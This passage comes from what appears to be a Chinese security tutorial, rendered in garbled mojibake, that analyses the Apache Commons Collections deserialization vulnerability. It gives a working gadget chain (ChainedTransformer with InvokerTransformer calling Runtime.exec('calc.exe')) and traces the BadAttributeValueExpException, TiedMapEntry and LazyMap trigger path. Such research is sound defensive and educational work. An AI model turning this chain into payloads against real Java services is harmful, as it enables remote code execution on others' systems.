FileOutputStream("object.ser"); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(Unsafe); os.close(); fos.close(); System.out.println("[*]ååºåˆ—åŒ–æ–‡ä»¶ä¸­ä¿å­˜çš„åºåˆ—åŒ–å¯¹è±¡"); FileInputStream fis = new FileInputStream("object.ser"); ObjectInputStream ois = new ObjectInputStream(fis); UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); fis.close(); &#125;&#125;class UnsafeClass implements Serializable&#123; public String name; //é‡å†™readObject()æ–¹æ³• private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³• in.defaultReadObject(); //æ‰§è¡Œå‘½ä»¤ Runtime.getRuntime().exec("calc.exe"); &#125;&#125; å¯ä»¥çœ‹åˆ°ï¼Œåœ¨readObject()æ–¹æ³•è°ƒç”¨æ—¶Javaçš„åºåˆ—åŒ–æœºåˆ¶ä¼šå…ˆå¯»æ‰¾ç”¨æˆ·æ˜¯å¦è‡ªå®šä¹‰äº†readObject()æ–¹æ³•ï¼Œè‹¥æœ‰åˆ™ç›´æŽ¥è°ƒç”¨è¯¥è‡ªå®šä¹‰çš„æ–¹æ³•è€Œéžé»˜è®¤çš„readObject()æ–¹æ³•ï¼š Apache Commons Collectionsååºåˆ—åŒ–æ¼æ´žåˆ†æžApache Commons Collectionsæ˜¯ä¸€ä¸ªæ‰©å±•äº†Javaæ ‡å‡†åº“é‡Œçš„Collectionç»“æž„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ï¼ŒåŒ…å«äº†å¾ˆå¤šjarå·¥å…·åŒ…ï¼Œæä¾›äº†å¾ˆå¤šå¼ºæœ‰åŠ›çš„æ•°æ®ç»“æž„ç±»åž‹å¹¶ä¸”å®žçŽ°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚ org.apache.commons.collectionsæä¾›ä¸€ä¸ªç±»åŒ…æ¥æ‰©å±•å’Œå¢žåŠ æ ‡å‡†çš„Javaçš„collectionæ¡†æž¶ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™äº›æ‰©å±•ä¹Ÿå±žäºŽcollectionçš„åŸºæœ¬æ¦‚å¿µï¼Œåªæ˜¯åŠŸèƒ½ä¸åŒç½¢äº†ã€‚Javaä¸­çš„collectionå¯ä»¥ç†è§£ä¸ºä¸€ç»„å¯¹è±¡ï¼Œcollectioné‡Œé¢çš„å¯¹è±¡ç§°ä¸ºcollectionçš„å¯¹è±¡ã€‚å…·è±¡çš„collectionä¸ºsetã€listã€queueç­‰ç­‰ï¼Œå®ƒä»¬æ˜¯é›†åˆç±»åž‹ã€‚æ¢ä¸€ç§ç†è§£æ–¹å¼ï¼Œcollectionæ˜¯setã€listã€queueçš„æŠ½è±¡ã€‚ ä½œä¸ºApacheå¼€æºé¡¹ç›®çš„é‡è¦ç»„ä»¶ï¼ŒCommons Collectionsè¢«å¹¿æ³›åº”ç”¨äºŽå„ç§Javaåº”ç”¨çš„å¼€å‘ï¼Œè€Œæ­£æ˜¯å› ä¸ºåœ¨å¤§é‡webåº”ç”¨ç¨‹åºä¸­è¿™äº›ç±»çš„å®žçŽ°ä»¥åŠæ–¹æ³•çš„è°ƒç”¨ï¼Œå¯¼è‡´äº†ååºåˆ—åŒ–ç”¨æ¼æ´žçš„æ™®éæ€§å’Œä¸¥é‡æ€§ã€‚ å½±å“ç‰ˆæœ¬ï¼š3.2.1åŠä»¥ä¸‹ç‰ˆæœ¬çš„Commons CollectionsåŒ…ã€‚ ä¸‹é¢å°±ç®€å•åœ°æ¨¡æ‹Ÿè¯¥åºåˆ—åŒ–æ¼æ´žäº§ç”Ÿã€payloadçš„æž„é€ åŠåˆ©ç”¨è¿‡ç¨‹ã€‚è¿™é‡Œç¤ºä¾‹ç”¨çš„commons-collections-3.2.1.jaråŒ…ã€‚ æ¼æ´žç‚¹Apache Commons Collectionsä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„æŽ¥å£Transformerï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå®žçŽ°è¯¥æŽ¥å£çš„ç±»InvokerTransformerå¯ä»¥é€šè¿‡è°ƒç”¨Javaçš„åå°„æœºåˆ¶æ¥è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œå…¶æºç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class InvokerTransformer implements Transformer, Serializable &#123; private static final long serialVersionUID = -8653385846894047688L; private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; public static Transformer getInstance(String methodName) &#123; if (methodName == null) &#123; throw new IllegalArgumentException("The method to invoke must not be null"); &#125; else &#123; return new InvokerTransformer(methodName); &#125; &#125; public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args) &#123; if (methodName == null) &#123; throw new IllegalArgumentException("The method to invoke must not be null"); &#125; else if (paramTypes == null &amp;&amp; args != null || paramTypes != null &amp;&amp; args == null || paramTypes != null &amp;&amp; args != null &amp;&amp; paramTypes.length != args.length) &#123; throw new IllegalArgumentException("The parameter types must match the arguments"); &#125; else if (paramTypes != null &amp;&amp; paramTypes.length != 0) &#123; paramTypes = (Class[])((Class[])paramTypes.clone()); args = (Object[])((Object[])args.clone()); return new InvokerTransformer(methodName, paramTypes, args); &#125; else &#123; return new InvokerTransformer(methodName); &#125; &#125; private InvokerTransformer(String methodName) &#123; this.iMethodName = methodName; this.iParamTypes = null; this.iArgs = null; &#125; public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var4) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist"); &#125; catch (IllegalAccessException var5) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed"); &#125; catch (InvocationTargetException var6) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6); &#125; &#125; &#125;&#125; å¯ä»¥çœ‹åˆ°è¯¥InvokerTransformerç±»æ˜¯å®žçŽ°TransformeræŽ¥å£çš„ï¼ˆTransformeræŽ¥å£ä¸»è¦ç”¨äºŽè½¬æ¢å¹¶è¿”å›žä¸€ä¸ªç»™å®šçš„Objectå¯¹è±¡ï¼‰ï¼Œä¸”å…¶ä¸­çš„transform()æ–¹æ³•é‡‡ç”¨åå°„æœºåˆ¶è¿›è¡Œä»»æ„å‡½æ•°è°ƒç”¨ï¼Œè¿™å°±æ˜¯æ¼æ´žç‚¹æ‰€åœ¨ã€‚ è¿™é‡Œæ˜¯åå°„æœºåˆ¶å…³é”®çš„ä¸‰å¥ä»£ç ï¼š 123Class cls = input.getClass();Method method = cls.getMethod(this.iMethodName, this.iParamTypes);return method.invoke(input, this.iArgs); ç¬¬ä¸€å¥ï¼šinputä¸ºObjectå¯¹è±¡ï¼ŒèŽ·å–å…¶å¯¹åº”çš„Classï¼› ç¬¬äºŒå¥ï¼šèŽ·å–clsç±»ä¸­å…·ä½“çš„æ–¹æ³•å¯¹è±¡ï¼› ç¬¬ä¸‰å¥ï¼šæ‰§è¡Œinputå¯¹è±¡çš„methodæ–¹æ³•ï¼Œè¿”å›žåŒmethodä¸€æ ·çš„è¿”å›žç±»åž‹ã€‚ ä¸Šè¿°ä¸‰å¥ä»£ç å…¶å®žç­‰åŒäºŽä¸‹é¢çš„ä»£ç ï¼Œå³å¯ä»¥ç›´æŽ¥åˆå¹¶èµ·æ¥ï¼š 1input.getClass().getMethod(this.iMethodName, this.iParamTypes).invoke(input, this.iArgs); ä¸‹é¢ç¼–å†™ä»£ç è¿›è¡Œå¼¹å‡ºè®¡ç®—å™¨çš„æµ‹è¯•æ¥éªŒè¯è¯¥æ¼æ´žç‚¹æ˜¯å¦èƒ½åˆ©ç”¨ï¼š 123456789public class POC_Test&#123; public static void main(String[] args) throws Exception &#123; InvokerTransformer it = new InvokerTransformer( "exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;); it.transform(java.lang.Runtime.getRuntime()); &#125;&#125; å¯ä»¥çœ‹åˆ°æ˜¯å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨çš„ï¼Œå³å¯ä»¥è¿›è¡Œæ¼æ´žåˆ©ç”¨ï¼Œä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬ä¸èƒ½ä»Žå¤–éƒ¨ç›´æŽ¥ä¼ å…¥java.lang.Runtime.getRuntime()ï¼Œè¿™æ—¶å°±éœ€è¦æˆ‘ä»¬åŽ»æž„é€ é“¾å¼ç»“æž„çš„payloadæ¥å®žçŽ°æ¼æ´žåˆ©ç”¨ã€‚ ä¸‹é¢å°±å¼€å§‹æž„é€ åå°„é“¾payloadæ¥å®žçŽ°ååºåˆ—åŒ–æ¼æ´žçš„åˆ©ç”¨ã€‚ 1ã€é€šè¿‡åå°„æž„é€ å¯åºåˆ—åŒ–çš„æ¶æ„åå°„é“¾å¯¹è±¡ä¸€æ­¥æ­¥æ¥ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œè¦è®©Javaç¨‹åºæ‰§è¡Œæ‰§è¡Œå‘½ä»¤ï¼Œé€šå¸¸æ˜¯èŽ·å–åˆ°Runtimeçš„å®žä¾‹ï¼Œå†è°ƒç”¨å®ƒçš„exec()æ‰§è¡Œå‘½ä»¤ï¼š 12Runtime runtime = Runtime.getRuntime();runtime.exec(cmd); æŽ¥ç€å°†å…¶è¡¨ç¤ºä¸ºé“¾å¼ç»“æž„çš„å½¢å¼ï¼Œå› ä¸ºåº•å±‚é€šè¿‡åå°„æŠ€æœ¯èŽ·å–å¯¹è±¡è°ƒç”¨å‡½æ•°éƒ½ä¼šå­˜åœ¨ä¸€ä¸ªä¸Šä¸‹æ–‡çŽ¯å¢ƒï¼Œä½¿ç”¨é“¾å¼ç»“æž„çš„è¯­å¥å¯ä»¥ä¿è¯æ‰§è¡Œè¿‡ç¨‹ä¸­è¿™ä¸ªä¸Šä¸‹æ–‡æ˜¯ä¸€è‡´çš„ï¼š 1java.lang.Runtime.getRuntime().exec(cmd) å¥½äº†ï¼Œæˆ‘ä»¬çŸ¥é“æž„é€ çš„åå°„é“¾æ˜¯è¿™ç§æ ¼å¼ï¼Œä¸‹é¢å¼€å§‹åˆ†æžCommons Collectionsçš„payloadçš„é“¾å¼ç»“æž„ã€‚ Commons Collectionsä¸­æœ‰ä¸€ä¸ªç”¨äºŽå¯¹è±¡ä¹‹é—´è½¬æ¢çš„TransformeræŽ¥å£ï¼Œå…ˆçœ‹æž„é€ çš„é“¾å¼ç»“æž„payloadä¸­æ¶‰åŠåˆ°çš„å‡ ä¸ªå®žçŽ°ç±»ï¼Œåªéœ€çœ‹å…¶æž„é€ æ–¹æ³•å’Œtransform()æ–¹æ³•å³å¯ã€‚ 1ã€ConstantTransformerç±»ï¼Œæ˜¯ä¸€ä¸ªTransformeræŽ¥å£å®žçŽ°ç±»ï¼Œå…¶æž„é€ æ–¹æ³•å’Œtransform()æ–¹æ³•å¦‚ä¸‹ï¼Œå¯çœ‹åˆ°transform()æ–¹æ³•ä¼šåŽŸå°ä¸åŠ¨åœ°è¿”å›žä¼ å…¥çš„Objectï¼Œä»Žè€Œå¯æž„é€ å¤–éƒ¨è¾“å…¥çš„å¸¸é‡å¦‚Runtime.classï¼š 1234567public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn;&#125;public Object transform(Object input) &#123; return this.iConstant;&#125; 2ã€InvokerTransformerç±»ï¼Œåœ¨æ¼æ´žç‚¹ä¸­å·²è¯´æ˜Žã€‚ 3ã€ChainedTransformerç±»ï¼Œæ˜¯ä¸€ä¸ªTransformeræŽ¥å£å®žçŽ°ç±»ï¼Œå…¶æž„é€ æ–¹æ³•å’Œtransform()æ–¹æ³•å¦‚ä¸‹ï¼Œå…¶transform()æ–¹æ³•ç”¨äºŽé“¾æŽ¥å¤šä¸ªæ­¥éª¤æž„é€ çš„transformerï¼Œå…¶ä¸­objectå‚æ•°ä¸ºä¸Šä¸€æ¬¡è°ƒç”¨transform()çš„è¿”å›žç»“æžœï¼š 12345678910public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers = transformers;&#125;public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object;&#125; æŽ¥ç€çœ‹ä¸‹é¢è¿™æ®µæž„é€ çš„payloadé“¾å¼ç»“æž„ï¼š 1234567Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe",&#125;),&#125;;Transformer transformerChain = new ChainedTransformer(transformers); æž„é€ è¿‡ç¨‹å¦‚ä¸‹ï¼š æž„é€ ä¸€ä¸ªConstantTransformerå¯¹è±¡ï¼ŒæŠŠRuntimeçš„Classå¯¹è±¡ä¼ è¿›åŽ»ï¼Œåœ¨transform()æ—¶ï¼Œå§‹ç»ˆä¼šè¿”å›žè¿™ä¸ªå¯¹è±¡ï¼› æž„é€ ä¸€ä¸ªInvokerTransformerå¯¹è±¡ï¼Œå¾…è°ƒç”¨æ–¹æ³•åä¸ºgetMethodï¼Œå‚æ•°ä¸ºgetRuntimeï¼Œåœ¨transform()æ—¶ï¼Œä¼ å…¥ç¬¬ä¸€æ­¥çš„ç»“æžœï¼Œæ­¤æ—¶çš„inputåº”è¯¥æ˜¯java.lang.Runtimeï¼Œä½†ç»è¿‡getClass()ä¹‹åŽï¼Œclsä¸ºjava.lang.Classï¼Œä¹‹åŽgetMethod()åªèƒ½èŽ·å–java.lang.Classçš„æ–¹æ³•ï¼Œå› æ­¤æ‰ä¼šå®šä¹‰çš„å¾…è°ƒç”¨æ–¹æ³•åä¸ºgetMethodï¼Œç„¶åŽå…¶å‚æ•°æ‰æ˜¯getRuntimeï¼Œå®ƒå¾—åˆ°çš„æ˜¯getMethodè¿™ä¸ªæ–¹æ³•çš„Methodå¯¹è±¡ï¼Œinvoke()è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæœ€ç»ˆå¾—åˆ°çš„æ‰æ˜¯getRuntimeè¿™ä¸ªæ–¹æ³•çš„Methodå¯¹è±¡ï¼› æž„é€ ä¸€ä¸ªInvokerTransformerå¯¹è±¡ï¼Œå¾…è°ƒç”¨æ–¹æ³•åä¸ºinvokeï¼Œå‚æ•°ä¸ºç©ºï¼Œåœ¨transform()æ—¶ï¼Œä¼ å…¥ç¬¬äºŒæ­¥çš„ç»“æžœï¼ŒåŒç†ï¼Œclså°†ä¼šæ˜¯java.lang.reflect.Methodï¼Œå†èŽ·å–å¹¶è°ƒç”¨å®ƒçš„invoke()æ–¹æ³•ï¼Œå®žé™…ä¸Šæ˜¯è°ƒç”¨ä¸Šé¢çš„getRuntime()æ‹¿åˆ°Runtimeå¯¹è±¡ï¼› æž„é€ ä¸€ä¸ªInvokerTransformerå¯¹è±¡ï¼Œå¾…è°ƒç”¨æ–¹æ³•åä¸ºexecï¼Œå‚æ•°ä¸ºå‘½ä»¤å­—ç¬¦ä¸²ï¼Œåœ¨transform()æ—¶ï¼Œä¼ å…¥ç¬¬ä¸‰æ­¥çš„ç»“æžœï¼ŒèŽ·å–java.lang.Runtimeçš„execæ–¹æ³•å¹¶ä¼ å‚è°ƒç”¨ï¼› æœ€åŽæŠŠå®ƒä»¬ç»„è£…æˆä¸€ä¸ªæ•°ç»„å…¨éƒ¨æ”¾è¿›ChainedTransformerä¸­ï¼Œåœ¨transform()æ—¶ï¼Œä¼šå°†å‰ä¸€ä¸ªå…ƒç´ çš„è¿”å›žç»“æžœä½œä¸ºä¸‹ä¸€ä¸ªçš„å‚æ•°ï¼Œåˆšå¥½æ»¡è¶³éœ€æ±‚ã€‚ æœ‰ä¸€ä¸ªé—®é¢˜â€”â€”ä¸Šé¢çš„ç¬¬2ã€3æ­¥æ˜¯ä¸æ˜¯å¯ä»¥ç®€åŒ–ä¸€ä¸‹ï¼Œè€ƒè™‘ç”¨ä¸‹é¢è¿™ç§é€»è¾‘æ›´æ¸…æ™°çš„æ–¹å¼æ¥æž„é€ å‘¢ï¼Ÿ 1234Transformer[] trans = new Transformer[] &#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer("getRuntime", new Class[0], new Object[0]), new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; cmd &#125;)&#125;; ç­”æ¡ˆæ˜¯ä¸è¡Œçš„ã€‚è™½ç„¶å•çœ‹æ•´ä¸ªé“¾ï¼Œæ— è®ºæ˜¯å®šä¹‰è¿˜æ˜¯æ‰§è¡Œéƒ½æ˜¯æ²¡æœ‰ä»»ä½•é—®é¢˜çš„ï¼Œä½†æ˜¯åœ¨åŽç»­åºåˆ—åŒ–æ—¶ï¼Œç”±äºŽRuntime.getRuntime()å¾—åˆ°çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¹Ÿéœ€è¦å‚ä¸Žåºåˆ—åŒ–è¿‡ç¨‹ï¼Œè€ŒRuntimeæœ¬èº«æ˜¯æ²¡æœ‰å®žçŽ°SerializableæŽ¥å£çš„ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´åºåˆ—åŒ–å¤±è´¥ã€‚ æž„é€ å®Œè¿™æ¡Transformeré“¾ï¼Œå°±ç­‰ç€è°æ¥æ‰§è¡Œå®ƒçš„transform()äº†ã€‚ è¿™é‡Œå¯ä»¥å…ˆç›´æŽ¥åœ¨ä»£ç ä¸‹é¢æ·»åŠ transformerChain.transform(null);è¯­å¥æ¥æŸ¥çœ‹è¯¥Transformeré“¾æ˜¯å¦çœŸçš„å¯ä»¥æ‰§è¡Œå‘½ä»¤ä¸”è¯¥å¯¹è±¡æ˜¯å¦å¯ä»¥è¢«åºåˆ—åŒ–ï¼Œä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š 1234567891011121314151617181920public class test &#123; public static void main(String args[]) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe",&#125;), &#125;; Transformer transformerChain = new ChainedTransformer(transformers); //æµ‹è¯•æˆ‘ä»¬çš„æ¶æ„å¯¹è±¡æ˜¯å¦å¯ä»¥è¢«åºåˆ—åŒ– ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(transformerChain); //æ‰§è¡Œä»¥ä¸‹è¯­å¥å°±å¯ä»¥è°ƒç”¨èµ·è®¡ç®—å™¨ transformerChain.transform(null); &#125;&#125; æ‰§è¡Œä¹‹åŽç¨‹åºæ²¡æŠ¥é”™ï¼Œå³è¯¥Transformeré“¾å¯ä»¥è¿›è¡Œåºåˆ—åŒ–ï¼Œå¹¶ä¸”åœ¨æ‰§è¡ŒtransformerChain.transform(null);æ—¶æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼š è¯¥Transformeré“¾æ²¡æœ‰é—®é¢˜ï¼Œä¸‹é¢å°±æ˜¯æ‰¾Commons Collectionsä¸­å“ªäº›åœ°æ–¹å¯ä»¥æ‰§è¡Œè¯¥Transformeré“¾çš„transform()æ–¹æ³•ä»¥åŠå¯»æ‰¾å«æœ‰è‡ªå®šä¹‰æœ‰æ¼æ´žçš„readObject()æ–¹æ³•çš„ç±»äº†ã€‚ 2ã€æŸ¥æ‰¾è‡ªå®šä¹‰readObject()æ–¹æ³•ä¸”å­˜åœ¨æ¼æ´žä»£ç çš„ç±»å¦‚ç½‘ä¸Šæ‰€è¯´ï¼Œåœ¨JDKè¾ƒæ—©çš„ç‰ˆæœ¬ä¸­å­˜åœ¨AnnotationInvocationHandlerç±» ï¼Œå…¶ç±»å¯¹è±¡åœ¨åˆå§‹åŒ–æ—¶å¯ä»¥ä¼ å…¥ä¸€ä¸ªMapç±»åž‹å‚æ•°èµ‹å€¼ç»™å­—æ®µmemberValuesï¼ŒreadObject()è¿‡ç¨‹ä¸­å¦‚æžœæ»¡è¶³ä¸€å®šæ¡ä»¶å°±ä¼šå¯¹memberValuesä¸­çš„å…ƒç´ è¿›è¡ŒsetValue()ã€‚ ä½†æ˜¯ï¼Œåœ¨è¾ƒæ–°ç‰ˆæœ¬çš„JDKä¸­AnnotationInvocationHandleræ²¡æœ‰äº†setValue()æ–¹æ³•ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨BadAttributeValueExpExceptionç±»æ¥å®žçŽ°ã€‚ç”±äºŽæœ¬åœ°çŽ¯å¢ƒçš„JDKä¸ºè¾ƒæ–°çš„ç‰ˆæœ¬ï¼Œå› æ­¤å°±åªæš‚æ—¶å¯¹BadAttributeValueExpExceptionç±»è¿›è¡Œåˆ†æžã€‚ BadAttributeValueExpException ä¸‹é¢çœ‹ä¸‹BadAttributeValueExpExceptionç±»å®šä¹‰ï¼Œå¯ä»¥çœ‹åˆ°å®šä¹‰äº†ä¸€ä¸ªåä¸ºvalçš„å¯¹è±¡ç±»åž‹å±žæ€§ï¼Œä¸”è‡ªå®šä¹‰äº†readObject()æ–¹æ³•ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class BadAttributeValueExpException extends Exception &#123; /* Serial version */ private static final long serialVersionUID = -3105272988410493376L; /** * @serial A string representation of the attribute that originated this exception. * for example, the string value can be the return of &#123;@code attribute.toString()&#125; */ private Object val; /** * Constructs a BadAttributeValueExpException using the specified Object to * create the toString() value. * * @param val the inappropriate value. */ public BadAttributeValueExpException (Object val) &#123; this.val = val == null ? null : val.toString(); &#125; /** * Returns the string representing the object. */ public String toString() &#123; return "BadAttributeValueException: " + val; &#125; private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get("val", null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName(); &#125; &#125; &#125; æŸ¥çœ‹è‡ªå®šä¹‰çš„readObejct()æ–¹æ³•ï¼Œå…¶ä¸­åœ¨æ»¡è¶³System.getSecurityManager() == nullæ—¶ä¼šè°ƒç”¨ valObj.toString()ï¼Œä»Žæ”»å‡»æ€è·¯ä¸Šçœ‹ï¼Œå…¶ä»–çš„æ¡ä»¶éƒ½æ˜¯æ— æ³•æ»¡è¶³çš„ã€‚å› æ­¤valObj.toString()å°±æˆä¸ºäº†çªç ´å£ï¼Œæ­¤æ—¶è¦æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„å·¥å…·åœ¨toString()æ–¹æ³•è¢«è°ƒç”¨çš„æ—¶å€™ä¼šè§¦å‘æˆ‘ä»¬æž„é€ çš„æ¶æ„ä»£ç ã€‚ 3ã€æŸ¥æ‰¾å¯é€šè¿‡toString()è§¦å‘transform()æ–¹æ³•çš„åˆé€‚çš„ç±»ä»ŽBadAttributeValueExpExceptionç±»çš„readObejct()æ–¹æ³•çŸ¥é“ï¼Œå…³æ³¨ç‚¹åœ¨valObj.toString()ä¸­ï¼Œé‚£ä¹ˆçŽ°åœ¨å°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„ç±»åœ¨è°ƒç”¨toString()æ–¹æ³•æ—¶è§¦å‘transform()æ–¹æ³•æ¥æ‰§è¡Œæˆ‘ä»¬æž„é€ çš„åå°„é“¾ã€‚ LazyMapâ€”â€”è°ƒç”¨get()æ–¹æ³•è§¦å‘transform()æ–¹æ³• LazyMapæ˜¯Commons-collections 3.1æä¾›çš„ä¸€ä¸ªå·¥å…·ç±»ï¼Œæ˜¯Mapçš„ä¸€ä¸ªå®žçŽ°ï¼Œä¸»è¦çš„å†…å®¹æ˜¯åˆ©ç”¨å·¥åŽ‚è®¾è®¡æ¨¡å¼ï¼Œåœ¨ç”¨æˆ·getä¸€ä¸ªä¸å­˜åœ¨çš„keyçš„æ—¶å€™æ‰§è¡Œä¸€ä¸ªæ–¹æ³•æ¥ç”ŸæˆKeyå€¼ï¼Œå½“ä¸”ä»…å½“getè¡Œä¸ºå­˜åœ¨çš„æ—¶å€™Valueæ‰ä¼šè¢«ç”Ÿæˆã€‚å…¶å®šä¹‰ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123; private static final long serialVersionUID = 7990956402564206740L; protected final Transformer factory; public static Map decorate(Map map, Factory factory) &#123; return new LazyMap(map, factory); &#125; public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; protected LazyMap(Map map, Factory factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException("Factory must not be null"); &#125; else &#123; this.factory = FactoryTransformer.getInstance(factory); &#125; &#125; protected LazyMap(Map map, Transformer factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException("Factory must not be null"); &#125; else &#123; this.factory = factory; &#125; &#125; private void writeObject(ObjectOutputStream out) throws IOException &#123; out.defaultWriteObject(); out.writeObject(this.map); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; in.defaultReadObject(); this.map = (Map)in.readObject(); &#125; public Object get(Object key) &#123; if (!this.map.containsKey(key)) &#123; Object value = this.factory.transform(key); this.map.put(key, value); return value; &#125; else &#123; return this.map.get(key); &#125; &#125;&#125; LazyMapæµ‹è¯•ä»£ç ï¼Œåœ¨getä¸€ä¸ªä¸å­˜åœ¨çš„keyçš„æ—¶å€™æ‰§è¡Œä¸€ä¸ªæ–¹æ³•æ¥ç”ŸæˆKeyå€¼ï¼Œä¸‹é¢çš„ä»£ç è¿è¡Œç»“æžœä¼šè°ƒç”¨transform()è¾“å‡ºâ€Mi1k7eaâ€ï¼š 12345678910public class Test&#123; public static void main(String[] args) throws Exception &#123; Map targetMap = LazyMap.decorate(new HashMap(), new Transformer() &#123; public Object transform(Object input) &#123; return "Mi1k7ea"; &#125; &#125;); System.out.println(targetMap.get("hhhhhhhh")); &#125;&#125; TiedMapEntryâ€”â€”è°ƒç”¨toString()æ–¹æ³•è§¦å‘getValue()æ–¹æ³•ï¼ˆå³LazyMap.get()ï¼‰ TiedMapEntryä¹Ÿå­˜åœ¨äºŽCommons-collections 3.1ï¼Œè¯¥ç±»ä¸»è¦çš„ä½œç”¨æ˜¯å°†ä¸€ä¸ªMapç»‘å®šåˆ°Map.Entryä¸‹ï¼Œå½¢æˆä¸€ä¸ªæ˜ å°„ã€‚ ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172public class TiedMapEntry implements Entry, KeyValue, Serializable &#123; private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) &#123; this.map = map; this.key = key; &#125; public Object getKey() &#123; return this.key; &#125; public Object getValue() &#123; return this.map.get(this.key); &#125; public Object setValue(Object value) &#123; if (value == this) &#123; throw new IllegalArgumentException("Cannot set value to this map entry"); &#125; else &#123; return this.map.put(this.key, value); &#125; &#125; public boolean equals(Object obj) &#123; if (obj == this) &#123; return true; &#125; else if (!(obj instanceof Entry)) &#123; return false; &#125; else &#123; boolean var10000; label43: &#123; label29: &#123; Entry other = (Entry)obj; Object value = this.getValue(); if (this.key == null) &#123; if (other.getKey() != null) &#123; break label29; &#125; &#125; else if (!this.key.equals(other.getKey())) &#123; break label29; &#125; if (value == null) &#123; if (other.getValue() == null) &#123; break label43; &#125; &#125; else if (value.equals(other.getValue())) &#123; break label43; &#125; &#125; var10000 = false; return var10000; &#125; var10000 = true; return var10000; &#125; &#125; public int hashCode() &#123; Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; public String toString() &#123; return this.getKey() + "=" + this.getValue(); &#125;&#125; åˆ†æžä¸‹è¿™ä¸ªç±»ï¼Œé¦–å…ˆæ˜¯toString()ä¸­è°ƒç”¨äº†getValue()ï¼Œè€ŒgetValue()ä¸­å®žé™…æ˜¯map.get(key)ï¼Œå¦‚æ­¤ä¸€æ¥å°±æž„å»ºèµ·äº†æ•´ä¸ªè°ƒç”¨é“¾æŽ¥äº†ã€‚ æž„é€ è¿‡ç¨‹å°ç»“BadAttributeValueExpException 